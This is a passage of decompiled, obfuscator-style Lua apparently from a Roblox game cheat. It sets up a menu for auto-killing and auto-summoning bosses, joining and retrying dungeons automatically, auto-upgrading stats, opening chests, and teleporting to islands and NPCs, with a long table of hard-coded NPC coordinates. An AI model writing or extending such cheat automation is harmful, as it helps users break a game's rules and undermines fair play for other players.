        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Kill Maiden"
        values.itemsState3.value.Default = false
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss56 = values.bossState.value
        values.bossState2.value = values.boss56
        values.bossState.value = values.boss56.OnChanged
        values.textValueState5.value = functions.handleSpawn10(environment, values.callback9)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handleWaitAtLine109(environment, values.options)
        values.bossState.value(values.bossState2.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handleWait4(
            environment,
            values.options,
            values.callback8,
            values.callback13,
            values.callback15,
            values.callback14
        )
        values.bossState.value(values.bossState2.value)
        values.bossState.value = values.items31.Boss
        values.boss57 = values.bossState.value
        values.bossState2.value = values.boss57
        values.bossState.value = values.boss57.AddSection
        values.textValueState5.value = "Saber Alter Summon"
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment._G
        values.bossState.value.SelectedSaberAlterDifficulty = "Normal"
        values.bossState.value = values.items31.Boss
        values.boss58 = values.bossState.value
        values.bossState2.value = values.boss58
        values.bossState.value = values.boss58.AddDropdown
        values.textValueState5.value = "SelectSaberAlterDifficulty"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Select Difficulty"
        values.valuesState2.value = runtime.create(4)
        values.textValueState6.value = "Normal"
        runtime.move(
            { values.textValueState6.value, "Medium", "Hard", "Extreme" },
            1,
            4,
            1,
            values.valuesState2.value
        )
        values.itemsState3.value.Values = values.valuesState2.value
        values.itemsState3.value.Multi = false
        values.itemsState3.value.Default = 1
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss59 = values.bossState.value
        values.bossState2.value = values.boss59
        values.bossState.value = values.boss59.OnChanged
        values.textValueState5.value = functions.handleCallback19(environment)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.Boss
        values.boss60 = values.bossState.value
        values.bossState2.value = values.boss60
        values.bossState.value = values.boss60.AddToggle
        values.textValueState5.value = "AutoSummonSaberAlter"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Summon Saber Alter"
        values.itemsState3.value.Default = false
        values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.bossState.value = values.items31.Boss
        values.boss61 = values.bossState.value
        values.bossState2.value = values.boss61
        values.bossState.value = values.boss61.AddToggle
        values.textValueState5.value = "AutoKillSaberAlter"
        values.itemsState3.value = {}
        values.itemsState3.value.Title = "Auto Kill Saber Alter"
        values.itemsState3.value.Default = false
        values.bossState.value = values.bossState.value(
            values.bossState2.value,
            values.textValueState5.value,
            values.itemsState3.value
        )
        values.boss62 = values.bossState.value
        values.bossState2.value = values.boss62
        values.bossState.value = values.boss62.OnChanged
        values.textValueState5.value = functions.handleSpawn6(environment, values.callback9)
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handleWaitAtLine77(environment, values.options)
        values.bossState.value(values.bossState2.value)
        values.bossState.value = environment.task
        values.bossState.value = values.bossState.value.spawn
        values.bossState2.value = functions.handleWaitAtLine120(
            environment,
            values.options,
            values.callback8,
            values.callback13,
            values.callback15,
            values.callback14
        )
        values.bossState.value(values.bossState2.value)
        values.bossState.value = values.items31.Dungeon
        values.boss63 = values.bossState.value
        values.bossState2.value = values.boss63
        values.bossState.value = values.boss63.AddSection
        values.textValueState5.value = "Quest Shadow"
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.Dungeon
        values.boss64 = values.bossState.value
        values.bossState2.value = values.boss64
        values.bossState.value = values.boss64.AddButton
        values.textValueState5.value = {}
        values.textValueState5.value.Title = "Quest Shadow"
        values.textValueState5.value.Description = "รับเควส Shadow"
        values.itemsState3.value =
            functions.callbackAtLine2565(environment, values.textValueState, values.result13)
        values.textValueState5.value.Callback = values.itemsState3.value
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = values.items31.Dungeon
        values.boss65 = values.bossState.value
        values.bossState2.value = values.boss65
        values.bossState.value = values.boss65.AddSection
        values.textValueState5.value = "Dungeon Portal"
        values.bossState.value(values.bossState2.value, values.textValueState5.value)
        values.bossState.value = "CidDungeon"
        values.bossState2.value = values.items31.Dungeon
        values.dungeon = values.bossState2.value
        values.textValueState5.value = values.dungeon
        values.bossState2.value = values.dungeon.AddDropdown
        values.itemsState3.value = "SelectDungeon"
        values.valuesState2.value = {}
        values.valuesState2.value.Title = "Select Dungeon"
        values.textValueState6.value = runtime.create(4)
        runtime.move(
            { "CidDungeon", "RuneDungeon", "DoubleDungeon", "BossRush" },
            1,
            4,
            1,
            values.textValueState6.value
        )
        values.valuesState2.value.Values = values.textValueState6.value
        values.valuesState2.value.Multi = false
        values.valuesState2.value.Default = 1
        values.bossState2.value = values.bossState2.value(
            values.textValueState5.value,
            values.itemsState3.value,
            values.valuesState2.value
        )
        values.dungeon2 = values.bossState2.value
        values.textValueState5.value = values.dungeon2
        values.bossState2.value = values.dungeon2.OnChanged
        values.itemsState3.value = functions.callback4(environment, values.bossState)
        values.bossState2.value(values.textValueState5.value, values.itemsState3.value)
        values.bossState2.value = values.items31.Dungeon
        values.dungeon3 = values.bossState2.value
        values.textValueState5.value = values.dungeon3
        values.bossState2.value = values.dungeon3.AddToggle
        values.itemsState3.value = "AutoJoinDungeon"
        values.valuesState2.value = {}
        values.valuesState2.value.Title = "Auto Join Dungeon"
        values.valuesState2.value.Default = false
        values.bossState2.value(
            values.textValueState5.value,
            values.itemsState3.value,
            values.valuesState2.value
        )
        values.bossState2.value = values.items31.Dungeon
        values.dungeon4 = values.bossState2.value
        values.textValueState5.value = values.dungeon4
        values.bossState2.value = values.dungeon4.AddToggle
        values.itemsState3.value = "AutoJoinTeam"
        values.valuesState2.value = {}
        values.valuesState2.value.Title = "Auto Join Team"
        values.valuesState2.value.Default = false
        values.bossState2.value(
            values.textValueState5.value,
            values.itemsState3.value,
            values.valuesState2.value
        )
        values.bossState2.value = values.items31.Dungeon
        values.dungeon5 = values.bossState2.value
        values.textValueState5.value = values.dungeon5
        values.bossState2.value = values.dungeon5.AddSection
        values.itemsState3.value = "Dungeon Wave Vote"
        values.bossState2.value(values.textValueState5.value, values.itemsState3.value)
        values.bossState2.value = "Extreme"
        values.textValueState5.value = values.items31.Dungeon
        values.textValue = values.textValueState5.value
        values.itemsState3.value = values.textValue
        values.textValueState5.value = values.textValue.AddDropdown
        values.valuesState2.value = "SelectDifficulty"
        values.textValueState6.value = {}
        values.textValueState6.value.Title = "Select Difficulty"
        values.values5 = runtime.create(4)
        runtime.move({ "Extreme", "Easy", "Medium", "Hard" }, 1, 4, 1, values.values5)
        values.textValueState6.value.Values = values.values5
        values.textValueState6.value.Multi = false
        values.textValueState6.value.Default = 1
        values.textValueState5.value = values.textValueState5.value(
            values.itemsState3.value,
            values.valuesState2.value,
            values.textValueState6.value
        )
        values.textValue2 = values.textValueState5.value
        values.itemsState3.value = values.textValue2
        values.textValueState5.value = values.textValue2.OnChanged
        values.valuesState2.value = functions.valuesAtLine1(environment, values.bossState2)
        values.textValueState5.value(values.itemsState3.value, values.valuesState2.value)
        values.textValueState5.value = values.items31.Dungeon
        values.textValue3 = values.textValueState5.value
        values.itemsState3.value = values.textValue3
        values.textValueState5.value = values.textValue3.AddToggle
        values.valuesState2.value = "AutoVoteDifficulty"
        values.textValueState6.value = {}
        values.textValueState6.value.Title = "Auto Vote Difficulty"
        values.textValueState6.value.Default = false
        values.textValueState5.value(
            values.itemsState3.value,
            values.valuesState2.value,
            values.textValueState6.value
        )
        values.textValueState5.value = values.items31.Dungeon
        values.textValue4 = values.textValueState5.value
        values.itemsState3.value = values.textValue4
        values.textValueState5.value = values.textValue4.AddToggle
        values.valuesState2.value = "StartKillDungeon"
        values.textValueState6.value = {}
        values.textValueState6.value.Title = "Start Kill"
        values.textValueState6.value.Default = false
        values.textValueState5.value(
            values.itemsState3.value,
            values.valuesState2.value,
            values.textValueState6.value
        )
        values.textValueState5.value = environment.task
        values.textValueState5.value = values.textValueState5.value.spawn
        values.itemsState3.value = functions.callbackAtLine115(environment, values.options, values.bossState)
        values.textValueState5.value(values.itemsState3.value)
        values.textValueState5.value = environment.task
        values.textValueState5.value = values.textValueState5.value.spawn
        values.itemsState3.value =
            functions.callback(environment, values.options, values.callback8, values.virtualInputManager)
        values.textValueState5.value(values.itemsState3.value)
        values.textValueState5.value = environment.task
        values.textValueState5.value = values.textValueState5.value.spawn
        values.itemsState3.value = functions.callbackAtLine40(environment, values.options)
        values.textValueState5.value(values.itemsState3.value)
        values.textValueState5.value = environment.task
        values.textValueState5.value = values.textValueState5.value.spawn
        values.itemsState3.value = functions.callbackAtLine123(environment, values.options, values.bossState2)
        values.textValueState5.value(values.itemsState3.value)
        values.textValueState5.value = environment.task
        values.textValueState5.value = values.textValueState5.value.spawn
        values.itemsState3.value = functions.callbackAtLine126(
            environment,
            values.options,
            values.localPlayer2,
            values.callback13,
            values.callback8,
            values.callback15,
            values.callback14
        )
        values.textValueState5.value(values.itemsState3.value)
        values.textValueState5.value = values.items31.Dungeon
        values.textValue5 = values.textValueState5.value
        values.itemsState3.value = values.textValue5
        values.textValueState5.value = values.textValue5.AddToggle
        values.valuesState2.value = "AutoRetryDungeon"
        values.textValueState6.value = {}
        values.textValueState6.value.Title = "Auto Retry"
        values.textValueState6.value.Default = false
        values.textValueState5.value(
            values.itemsState3.value,
            values.valuesState2.value,
            values.textValueState6.value
        )
        values.textValueState5.value = values.items31.Stats
        values.textValue6 = values.textValueState5.value
        values.itemsState3.value = values.textValue6
        values.textValueState5.value = values.textValue6.AddSection
        values.valuesState2.value = "Stat Settings"
        values.textValueState5.value(values.itemsState3.value, values.valuesState2.value)
        values.textValueState5.value = runtime.create(1)
        values.itemsState3.value = "Melee"
        runtime.move({ values.itemsState3.value }, 1, 1, 1, values.textValueState5.value)
        values.itemsState3.value = 1
        values.valuesState2.value = values.items31.Stats
        values.values6 = values.valuesState2.value
        values.textValueState6.value = values.values6
        values.valuesState2.value = values.values6.AddDropdown
        values.items23 = {}
        values.items23.Title = "Select Stat"
        values.values7 = runtime.create(4)
        runtime.move({ "Melee", "Defense", "Sword", "Power" }, 1, 4, 1, values.values7)
        values.items23.Values = values.values7
        values.items23.Multi = true
        values.default = runtime.create(1)
        runtime.move({ "Melee" }, 1, 1, 1, values.default)
        values.items23.Default = values.default
        values.valuesState2.value =
            values.valuesState2.value(values.textValueState6.value, "SelectStat", values.items23)
        values.values8 = values.valuesState2.value
        values.textValueState6.value = values.values8
        values.valuesState2.value = values.values8.OnChanged
        values.valuesState2.value(
            values.textValueState6.value,
            functions.handleCallback11(environment, values.textValueState5)
        )
        values.valuesState2.value = values.items31.Stats
        values.values9 = values.valuesState2.value
        values.textValueState6.value = values.values9
        values.valuesState2.value = values.values9.AddInput
        values.items24 = {}
        values.items24.Title = "Amount (จำนวนอัพ)"
        values.items24.Default = "1"
        values.items24.Placeholder = "Enter amount"
        values.items24.Numeric = true
        values.items24.Finished = false
        values.items24.Callback = functions.callbackAtLine1(environment, values.itemsState3)
        values.valuesState2.value(values.textValueState6.value, "StatAmountInput", values.items24)
        values.valuesState2.value = values.items31.Stats
        values.values10 = values.valuesState2.value
        values.textValueState6.value = values.values10
        values.valuesState2.value = values.values10.AddToggle
        values.items25 = {}
        values.items25.Title = "Auto Upgrade Stats"
        values.items25.Default = false
        values.valuesState2.value(values.textValueState6.value, "AutoStats", values.items25)
        values.valuesState2.value = environment.task
        values.valuesState2.value = values.valuesState2.value.spawn
        values.textValueState6.value =
            functions.values(environment, values.options, values.textValueState5, values.itemsState3)
        values.valuesState2.value(values.textValueState6.value)
        values.valuesState2.value = values.items31.Stats
        values.values11 = values.valuesState2.value
        values.textValueState6.value = values.values11
        values.valuesState2.value = values.values11.AddSection
        values.valuesState2.value(values.textValueState6.value, "Chest Management")
        values.valuesState2.value = runtime.create(1)
        values.textValueState6.value = "Common Chest"
        runtime.move({ values.textValueState6.value }, 1, 1, 1, values.valuesState2.value)
        values.textValueState6.value = 1
        values.stats = values.items31.Stats
        values.addDropdown4 = values.stats.AddDropdown
        values.items26 = {}
        values.items26.Title = "Select Chest Type"
        values.values12 = runtime.create(6)
        runtime.move(
            { "Secret Chest", "Mythical Chest", "Legendary Chest", "Epic Chest", "Rare Chest", "Common Chest" },
            1,
            6,
            1,
            values.values12
        )
        values.items26.Values = values.values12
        values.items26.Multi = true
        values.default2 = runtime.create(1)
        runtime.move({ "Common Chest" }, 1, 1, 1, values.default2)
        values.items26.Default = values.default2
        values.value14 = (values.addDropdown4(values.stats, "SelectChestType", values.items26))
        values.value14.OnChanged(values.value14, functions.handleCallback3(environment, values.valuesState2))
        values.stats2 = values.items31.Stats
        values.addInput2 = values.stats2.AddInput
        values.items27 = {}
        values.items27.Title = "Amount (จำนวนเปิด)"
        values.items27.Default = "1"
        values.items27.Placeholder = "Enter amount"
        values.items27.Numeric = true
        values.items27.Finished = false
        values.items27.Callback = functions.callback2(environment, values.textValueState6)
        values.addInput2(values.stats2, "ChestAmountInput", values.items27)
        values.stats3 = values.items31.Stats
        values.addButton4 = values.stats3.AddButton
        values.items28 = {}
        values.items28.Title = "Open Chest"
        values.items28.Description =
            "เปิดกล่องตามจำนวนและชนิดที่ระบุ"
        values.items28.Callback = functions.callbackAtLine65(
            environment,
            values.valuesState2,
            values.textValueState6,
            values.result13
        )
        values.addButton4(values.stats3, values.items28)
        values.stats4 = values.items31.Stats
        values.addToggle14 = values.stats4.AddToggle
        values.items29 = {}
        values.items29.Title = "Auto Open Selected (เปิดวนซ้ำ)"
        values.items29.Default = false
        values.addToggle14(values.stats4, "AutoOpenSelected", values.items29)
        environment.task.spawn(
            functions.handleTypeValueAtLine91(
                environment,
                values.options,
                values.valuesState2,
                functions.handleFindFirstChild5(environment),
                values.textValueState6
            )
        )
        values.teleport14 = values.items31.Teleport
        values.teleport14.AddSection(values.teleport14, "Island Teleport")
        values.values13 = {}
        values.callResults6 = runtime.pack(environment.pairs(values.items44))
        values.callResults7 = values.callResults6
        values.savedIterations4 = {
            values.savedIterations6,
            [5] = values.iterationStep3,
            values.iterationLimit3,
            values.iterationCursor6,
        }
        values.result17 = runtime.wrapIterator(runtime.iteratorBody1)
        values.result17(values.callResults7[1], values.callResults7[2], values.callResults7[3])
        values.iteratorKey3 = nil
        values.iterationCursor4 = values.result17
        while true do
            values.hasNext, values.iteratorKey2, values.iteratorValue = values.iterationCursor4()
            if not values.hasNext then
            else
                values.iteratorKey3 = values.iteratorKey2
            end
            if values.hasNext then
                environment.table.insert(values.values13, values.iteratorKey3)
                continue
            end
            break
        end
        values.iterationCursor2 = values.savedIterations4[3]
        values.iterationLimit2 = values.savedIterations4[2]
        values.iterationStep2 = values.savedIterations4[5]
        values.savedIterations2 = values.savedIterations4[1]
        environment.table.sort(values.values13)
        values.teleport11 = values.items31.Teleport
        values.addDropdown3 = values.teleport11.AddDropdown
        values.items19 = {}
        values.items19.Title = "Select Island"
        values.items19.Values = values.values13
        values.items19.Multi = false
        values.items19.Default = 1
        values.value13 = (values.addDropdown3(values.teleport11, "SelectIsland", values.items19))
        values.value13.OnChanged(values.value13, functions.handleCallback15(environment))
        values.teleport12 = values.items31.Teleport
        values.addButton3 = values.teleport12.AddButton
        values.items20 = {}
        values.items20.Title = "Teleport To Island"
        values.items20.Description = "Click to Teleport"
        values.items20.Callback = functions.callbackAtLine94(
            environment,
            values.callback6,
            values.items44,
            values.localPlayer2,
            values.callback8
        )
        values.addButton3(values.teleport12, values.items20)
        values.teleport13 = values.items31.Teleport
        values.teleport13.AddSection(values.teleport13, "NPC Teleport")
        values.items21 = {}
        values.new6 = environment.CFrame.new
        values.numberValueState.value = 0.0328925289
        values.numberValueState2.value = 0.897855699
        values.numberValueState3.value = 0.0412414782
        values.darkBladeNPC = values.new6(
            -132.496948,
            14.7835255,
            -1091.26355,
            -0.439278364,
            0.016457051,
            -0.898200333,
            -0.0298291016,
            0.999013662,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.438354224
        )
        values.items21["Dark Blade NPC"] = values.darkBladeNPC
        values.new7 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.390717506
        values.numberValueState3.value = 0
        values.hakiTrainer = values.new7(
            -497.93924,
            23.6579151,
            -1252.6405,
            0.92051065,
            0,
            0.390717506,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.92051065
        )
        values.items21["Haki Trainer"] = values.hakiTrainer
        values.new8 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 0.698449254
        values.numberValueState3.value = 0
        values.ragnaBuyer = values.new8(
            -272.070862,
            -4.23535013,
            -1353.33777,
            0.715659618,
            0,
            -0.698449254,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.715659618
        )
        values.items21.RagnaBuyer = values.ragnaBuyer
        values.new9 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 0.698449254
        values.numberValueState3.value = 0
        values.ragnaQuestlineBuff = values.new9(
            -261.790833,
            -4.23535013,
            -1436.71252,
            0.715659618,
            0,
            -0.698449254,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.715659618
        )
        values.items21.RagnaQuestlineBuff = values.ragnaQuestlineBuff
        values.new10 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 0.573571265
        values.numberValueState3.value = 0
        values.summonBossNPC = values.new10(
            692.040527,
            -3.67419362,
            -1085.31812,
            -0.819156051,
            0,
            -0.573571265,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.819156051
        )
        values.items21.SummonBossNPC = values.summonBossNPC
        values.new11 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.142497987
        values.numberValueState3.value = 0
        values.enchantNPC = values.new11(
            1415.31274,
            8.84003067,
            7.40811729,
            -0.989795089,
            0,
            0.142497987,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.989795089
        )
        values.items21.EnchantNPC = values.enchantNPC
        values.new12 = environment.CFrame.new
        values.numberValueState.value = -0.00322606321
        values.numberValueState2.value = 0.951807797
        values.numberValueState3.value = -0.0266217291
        values.gojoNpc = values.new12(
            1741.59265,
            157.300507,
            514.805054,
            -0.305511117,
            0.00515563227,
            -0.952174604,
            0.0269237738,
            0.999632299,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.305537581
        )
        values.items21.GojoNpc = values.gojoNpc
        values.new13 = environment.CFrame.new
        values.numberValueState.value = 0.0174425393
        values.numberValueState2.value = -0.989806235
        values.numberValueState3.value = -0.00252039498
        values.sukunaNpc = values.new13(
            1325.80103,
            162.85965,
            -34.6844749,
            0.142420411,
            -0.0172595233,
            0.989655793,
            -3.65991145e-05,
            0.999847889,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.142398119
        )
        values.items21.SukunaNpc = values.sukunaNpc
        values.new14 = environment.CFrame.new
        values.numberValueState.value = -0.00916113332
        values.numberValueState2.value = -0.572473705
        values.numberValueState3.value = -0.0135650001
        values.jinwooNpc = values.new14(
            91.2260056,
            2.98423171,
            1097.46631,
            -0.819854856,
            -0.00342408568,
            0.572561085,
            -0.0105738947,
            0.999902129,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.819810867
        )
        values.items21["Jinwoo Npc"] = values.jinwooNpc
        values.new15 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.987686574
        values.numberValueState3.value = 0
        values.titleNpc = values.new15(
            369.152405,
            2.79983521,
            783.487427,
            -0.156446099,
            0,
            0.987686574,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.156446099
        )
        values.items21.TitleNpc = values.titleNpc
        values.new16 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.987686574
        values.numberValueState3.value = 0
        values.randomFruitGem = values.new16(
            400.641937,
            2.79983521,
            752.175842,
            -0.156446099,
            0,
            0.987686574,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.156446099
        )
        values.items21["Random Fruit (Gem)"] = values.randomFruitGem
        values.new17 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.987686574
        values.numberValueState3.value = 0
        values.randomFruitCoin = values.new17(
            408.244568,
            2.82981968,
            802.734131,
            -0.156446099,
            0,
            0.987686574,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.156446099
        )
        values.items21["Random Fruit (Coin)"] = values.randomFruitCoin
        values.new18 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 0.987686574
        values.numberValueState3.value = 0
        values.storageNpc = values.new18(
            329.949493,
            2.94520569,
            764.059326,
            0.15644598,
            0,
            -0.987686574,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.15644598
        )
        values.items21.StorageNpc = values.storageNpc
        values.new19 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 0.987686574
        values.numberValueState3.value = 0
        values.traitsNpc = values.new19(
            337.284302,
            2.79983521,
            813.846558,
            0.15644598,
            0,
            -0.987686574,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.15644598
        )
        values.items21.TraitsNpc = values.traitsNpc
        values.new20 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 0.859966636
        values.numberValueState3.value = 0
        values.aizenNpc = values.new20(
            -346.134552,
            12.9912338,
            1402.1001,
            -0.510350227,
            0,
            -0.859966636,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.510350227
        )
        values.items21.AizenNpc = values.aizenNpc
        values.new21 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.984811902
        values.numberValueState3.value = 0
        values.aizenQuestBuff = values.new21(
            -892.005066,
            24.7202606,
            1229.99414,
            -0.173624277,
            0,
            0.984811902,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.173624277
        )
        values.items21.AizenQuestBuff = values.aizenQuestBuff
        values.new22 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.173621148
        values.numberValueState3.value = 0
        values.observationBuyer = values.new22(
            -713.182922,
            12.1339779,
            -527.289795,
            -0.984812617,
            0,
            0.173621148,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.984812617
        )
        values.items21.ObservationBuyer = values.observationBuyer
        values.new23 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 0.390717506
        values.numberValueState3.value = 0
        values.artifactsUnlocker = values.new23(
            -440.516388,
            1.77979147,
            -1095.86072,
            -0.92051065,
            0,
            -0.390717506,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.92051065
        )
        values.items21.ArtifactsUnlocker = values.artifactsUnlocker
        values.new24 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.936034739
        values.numberValueState3.value = 0
        values.yujiBuyerNPC = values.new24(
            1240.19263,
            136.700775,
            408.188354,
            -0.35190773,
            0,
            0.936034739,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.35190773
        )
        values.items21.YujiBuyerNPC = values.yujiBuyerNPC
        values.new25 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.987686574
        values.numberValueState3.value = 0
        values.rerollStatNPC = values.new25(
            373.071747,
            2.79983521,
            810.098328,
            -0.156446099,
            0,
            0.987686574,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.156446099
        )
        values.items21.RerollStatNPC = values.rerollStatNPC
        values.new26 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.987686574
        values.numberValueState3.value = 0
        values.merchant = values.new26(
            368.817719,
            2.79983521,
            783.589844,
            -0.156446099,
            0,
            0.987686574,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.156446099
        )
        values.items21.Merchant = values.merchant
        values.new27 = environment.CFrame.new
        values.numberValueState.value = -0.0183945931
        values.numberValueState2.value = 0.722953498
        values.numberValueState3.value = 0.0120828543
        values.shadowQuestlineBuff = values.new27(
            335.123474,
            25.5055599,
            -377.073486,
            0.690896153,
            -0.0138966013,
            -0.722820461,
            0.000865913928,
            0.999830425,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.690791011
        )
        values.items21.ShadowQuestlineBuff = values.shadowQuestlineBuff
        values.new28 = environment.CFrame.new
        values.numberValueState.value = 0.173609525
        values.numberValueState2.value = 0.422648191
        values.numberValueState3.value = -0.157341033
        values.cidBuyer = values.new28(
            1428.22986,
            49.2211456,
            -976.904297,
            0.906293869,
            0.0733761713,
            -0.416230023,
            -4.76837158e-07,
            0.984814584,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.892531395
        )
        values.items21.CidBuyer = values.cidBuyer
        values.new29 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 0.156449571
        values.numberValueState3.value = 0
        values.alucardBuyer = values.new29(
            476.07724,
            2.79983521,
            1037.76819,
            -0.987686276,
            0,
            -0.156449571,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.987686276
        )
        values.items21.AlucardBuyer = values.alucardBuyer
        values.new30 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.142497987
        values.numberValueState3.value = 0
        values.blessingNPC = values.new30(
            1420.94788,
            8.84003162,
            11.2125807,
            -0.989795089,
            0,
            0.142497987,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.989795089
        )
        values.items21.BlessingNPC = values.blessingNPC
        values.new31 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 0.156449571
        values.numberValueState3.value = 0
        values.ascendNPC = values.new31(
            252.082169,
            4.08967924,
            715.554565,
            -0.987686276,
            0,
            -0.156449571,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.987686276
        )
        values.items21.AscendNPC = values.ascendNPC
        values.new32 = environment.CFrame.new
        values.numberValueState.value = 0.175351709
        values.numberValueState2.value = 0.526566029
        values.numberValueState3.value = 0.15539968
        values.strongestinHistoryBuyer = values.new32(
            738.620239,
            89.1463165,
            -1895.94141,
            -0.850047231,
            0.0821449012,
            -0.520262122,
            -0.0121909715,
            0.984430373,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.8358109
        )
        values.items21.StrongestinHistoryBuyer = values.strongestinHistoryBuyer
        values.new33 = environment.CFrame.new
        values.numberValueState.value = -0.01219308
        values.numberValueState2.value = -0.523103356
        values.numberValueState3.value = 0.103642538
        values.strongestofTodayBuyer = values.new33(
            165.185959,
            148.998184,
            -2656.6604,
            0.834040165,
            -0.141939372,
            0.533132434,
            0.175327957,
            0.984434605,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.845943928
        )
        values.items21.StrongestofTodayBuyer = values.strongestofTodayBuyer
        values.new34 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 0.998446226
        values.numberValueState3.value = 0
        values.sukunaCraftNPC = values.new34(
            691.379395,
            1.88211524,
            -1991.82959,
            -0.0557233095,
            0,
            -0.998446226,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.0557233095
        )
        values.items21.SukunaCraftNPC = values.sukunaCraftNPC
        values.new35 = environment.CFrame.new
        values.numberValueState.value = 0.220325932
        values.numberValueState2.value = 0.224786729
        values.numberValueState3.value = -0.214735523
        values.sukunaMasteryNPC = values.new35(
            594.131226,
            30.152832,
            -2016.31396,
            0.974407971,
            0.0493175313,
            -0.219310075,
            0.000219687819,
            0.975426316,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.950452328
        )
        values.items21.SukunaMasteryNPC = values.sukunaMasteryNPC
        values.new36 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.627968073
        values.numberValueState3.value = 0
        values.gojoCraftNPC = values.new36(
            -122.008728,
            1.88212693,
            -2094.93726,
            0.778239131,
            0,
            0.627968073,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.778239131
        )
        values.items21.GojoCraftNPC = values.gojoCraftNPC
        values.new37 = environment.CFrame.new
        values.numberValueState.value = 0.378710806
        values.numberValueState2.value = -0.5777089
        values.numberValueState3.value = -0.486880362
        values.gojoMasteryNPC = values.new37(
            56.1712189,
            39.0576324,
            -2064.20288,
            0.756504416,
            -0.0179738849,
            0.653741717,
            -0.306518704,
            0.873283803,
